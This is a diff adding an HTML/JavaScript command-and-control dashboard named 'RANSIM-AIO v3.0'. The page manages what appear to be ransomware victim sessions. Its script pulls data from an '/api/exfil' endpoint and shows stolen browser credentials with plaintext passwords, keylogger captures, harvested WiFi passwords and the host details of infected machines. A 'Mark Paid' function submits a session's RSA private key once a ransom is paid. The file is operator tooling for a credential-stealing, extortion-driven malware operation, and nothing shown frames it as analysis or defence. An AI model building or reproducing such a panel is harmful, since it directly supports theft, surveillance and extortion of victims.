@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RANSIM-AIO v3.0 - C2 Dashboard</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: #0a0e17;
+            color: #e0e0e0;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #1a1f2e, #0d1117);
+            padding: 20px 30px;
+            border-bottom: 2px solid #00ff88;
+        }
+
+        .header h1 {
+            color: #00ff88;
+            font-size: 24px;
+        }
+
+        .header span {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            padding: 20px;
+        }
+
+        .stat-card {
+            background: #1a1f2e;
+            border-radius: 10px;
+            padding: 20px;
+            border: 1px solid #2a2f3e;
+        }
+
+        .stat-card h3 {
+            color: #00ff88;
+            font-size: 28px;
+        }
+
+        .stat-card p {
+            color: #888;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+
+        .content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            padding: 0 20px 20px;
+        }
+
+        @media (max-width: 1200px) {
+            .content {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .panel {
+            background: #1a1f2e;
+            border-radius: 10px;
+            border: 1px solid #2a2f3e;
+            overflow: hidden;
+        }
+
+        .panel-header {
+            background: #0d1117;
+            padding: 15px 20px;
+            border-bottom: 1px solid #2a2f3e;
+            font-weight: bold;
+            color: #00ff88;
+        }
+
+        .panel-body {
+            padding: 15px;
+            max-height: 500px;
+            overflow-y: auto;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 13px;
+        }
+
+        th {
+            text-align: left;
+            padding: 10px;
+            color: #888;
+            border-bottom: 1px solid #2a2f3e;
+            font-weight: normal;
+        }
+
+        td {
+            padding: 10px;
+            border-bottom: 1px solid #1a1f2e;
+        }
+
+        tr:hover {
+            background: #0d1117;
+        }
+
+        .status-active {
+            color: #00ff88;
+        }
+
+        .status-paid {
+            color: #ffaa00;
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 11px;
+        }
+
+        .badge-green {
+            background: #003d2a;
+            color: #00ff88;
+        }
+
+        .badge-yellow {
+            background: #3d2a00;
+            color: #ffaa00;
+        }
+
+        .badge-red {
+            background: #3d0000;
+            color: #ff4444;
+        }
+
+        .copy-btn {
+            cursor: pointer;
+            color: #00ff88;
+            font-size: 12px;
+        }
+
+        .copy-btn:hover {
+            text-decoration: underline;
+        }
+
+        .refresh-btn {
+            background: #00ff88;
+            color: #0a0e17;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            float: right;
+        }
+
+        .refresh-btn:hover {
+            background: #00cc6a;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="header">
+        <h1>🖥️ RANSIM-AIO v3.0 <span>— C2 Command & Control</span></h1>
+        <button class="refresh-btn" onclick="loadData()">⟳ Refresh</button>
+    </div>
+
+    <div class="stats" id="stats">
+        <div class="stat-card">
+            <h3 id="totalSessions">0</h3>
+            <p>Total Sessions</p>
+        </div>
+        <div class="stat-card">
+            <h3 id="activeSessions">0</h3>
+            <p>Active (last 1h)</p>
+        </div>
+        <div class="stat-card">
+            <h3 id="totalCreds">0</h3>
+            <p>Credentials</p>
+        </div>
+        <div class="stat-card">
+            <h3 id="totalKeylogs">0</h3>
+            <p>Keylog Entries</p>
+        </div>
+        <div class="stat-card">
+            <h3 id="totalWifi">0</h3>
+            <p>WiFi Networks</p>
+        </div>
+        <div class="stat-card">
+            <h3 id="paidSessions">0</h3>
+            <p>Paid Ransoms</p>
+        </div>
+    </div>
+
+    <div class="content">
+        <div class="panel">
+            <div class="panel-header">🟢 Active Sessions</div>
+            <div class="panel-body" id="sessionsTable">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Session ID</th>
+                            <th>Hostname</th>
+                            <th>User</th>
+                            <th>IP</th>
+                            <th>Status</th>
+                            <th>Last Seen</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="sessionsBody"></tbody>
+                </table>
+            </div>
+        </div>
+
+        <div class="panel">
+            <div class="panel-header">🔑 Credentials</div>
+            <div class="panel-body" id="credsTable">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Session</th>
+                            <th>URL / Origin</th>
+                            <th>Username</th>
+                            <th>Password</th>
+                            <th>Time</th>
+                        </tr>
+                    </thead>
+                    <tbody id="credsBody"></tbody>
+                </table>
+            </div>
+        </div>
+
+        <div class="panel">
+            <div class="panel-header">⌨️ Keylogger</div>
+            <div class="panel-body" id="keylogTable">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Session</th>
+                            <th>Content</th>
+                            <th>Time</th>
+                        </tr>
+                    </thead>
+                    <tbody id="keylogBody"></tbody>
+                </table>
+            </div>
+        </div>
+
+        <div class="panel">
+            <div class="panel-header">📶 WiFi Networks</div>
+            <div class="panel-body" id="wifiTable">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Session</th>
+                            <th>SSID</th>
+                            <th>Password</th>
+                            <th>Time</th>
+                        </tr>
+                    </thead>
+                    <tbody id="wifiBody"></tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const API = '/api/exfil';
+
+        async function loadData() {
+            try {
+                const resp = await fetch(API + '?type=dashboard&_=' + Date.now());
+                const data = await resp.json();
+
+                // Stats
+                document.getElementById('totalSessions').textContent = data.sessions?.length || 0;
+                document.getElementById('totalCreds').textContent = data.credentials?.length || 0;
+                document.getElementById('totalKeylogs').textContent = data.keylogs?.length || 0;
+                document.getElementById('totalWifi').textContent = data.wifi?.length || 0;
+
+                const oneHourAgo = Date.now() - 3600000;
+                const active = (data.sessions || []).filter(s => {
+                    const last = s.last_seen?._seconds ? s.last_seen._seconds * 1000 : 0;
+                    return last > oneHourAgo;
+                });
+                document.getElementById('activeSessions').textContent = active.length;
+                document.getElementById('paidSessions').textContent = (data.sessions || []).filter(s => s.is_paid).length;
+
+                // Sessions
+                const sBody = document.getElementById('sessionsBody');
+                sBody.innerHTML = (data.sessions || []).map(s => {
+                    const lastSeen = s.last_seen?._seconds ? new Date(s.last_seen._seconds * 1000).toLocaleString() : 'never';
+                    const status = s.is_paid ? '<span class="badge badge-yellow">Paid</span>' : '<span class="badge badge-green">Active</span>';
+                    return `<tr>
+        <td><code>${s.id?.substring(0, 16)}...</code></td>
+        <td>${s.hostname || '?'}</td>
+        <td>${s.username || '?'}</td>
+        <td>${s.ip || '?'}</td>
+        <td>${status}</td>
+        <td>${lastSeen}</td>
+        <td><button onclick="markPaid('${s.id}')" class="copy-btn">💰 Mark Paid</button></td>
+      </tr>`;
+                }).join('');
+
+                // Credentials
+                const cBody = document.getElementById('credsBody');
+                cBody.innerHTML = (data.credentials || []).map(c => {
+                    const ts = c.timestamp?._seconds ? new Date(c.timestamp._seconds * 1000).toLocaleString() : '';
+                    const cred = c.data || {};
+                    return `<tr>
+        <td><code>${c.session_id?.substring(0, 12)}..</code></td>
+        <td>${cred.url || cred.origin || '?'}</td>
+        <td>${cred.username || cred.email || '?'}</td>
+        <td><code>${cred.password || '?'}</code></td>
+        <td>${ts}</td>
+      </tr>`;
+                }).join('');
+
+                // Keylogs
+                const kBody = document.getElementById('keylogBody');
+                kBody.innerHTML = (data.keylogs || []).map(k => {
+                    const ts = k.timestamp?._seconds ? new Date(k.timestamp._seconds * 1000).toLocaleString() : '';
+                    return `<tr>
+        <td><code>${k.session_id?.substring(0, 12)}..</code></td>
+        <td><code>${(k.data?.content || k.data || '').substring(0, 100)}</code></td>
+        <td>${ts}</td>
+      </tr>`;
+                }).join('');
+
+                // WiFi
+                const wBody = document.getElementById('wifiBody');
+                wBody.innerHTML = (data.wifi || []).map(w => {
+                    const ts = w.timestamp?._seconds ? new Date(w.timestamp._seconds * 1000).toLocaleString() : '';
+                    const wifiData = w.data || {};
+                    const ssid = Array.isArray(wifiData) ? wifiData.map(x => x.ssid).join(', ') : wifiData.ssid || '?';
+                    const pass = Array.isArray(wifiData) ? wifiData.map(x => x.password).join(', ') : wifiData.password || '?';
+                    return `<tr>
+        <td><code>${w.session_id?.substring(0, 12)}..</code></td>
+        <td>${ssid}</td>
+        <td><code>${pass}</code></td>
+        <td>${ts}</td>
+      </tr>`;
+                }).join('');
+
+            } catch (e) {
+                console.error('Failed to load data:', e);
+            }
+        }
+
+        async function markPaid(sessionId) {
+            const privateKey = prompt('Enter RSA PRIVATE KEY for this session:');
+            if (!privateKey) return;
+
+            try {
+                const resp = await fetch(API, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ type: 'mark_paid', session_id: sessionId, private_key: privateKey })
+                });
+                const result = await resp.json();
+                if (result.status === 'ok') {
+                    alert('✅ Session marked as paid. Decryption key stored.');
+                    loadData();
+                } else {
+                    alert('❌ Error: ' + (result.error || 'unknown'));
+                }
+            } catch (e) {
+                alert('❌ Error: ' + e.message);
+            }
+        }
+
+        // Auto refresh every 30 seconds
+        loadData();
+        setInterval(loadData, 30000);
+    </script>
+</body>
+
+</html>
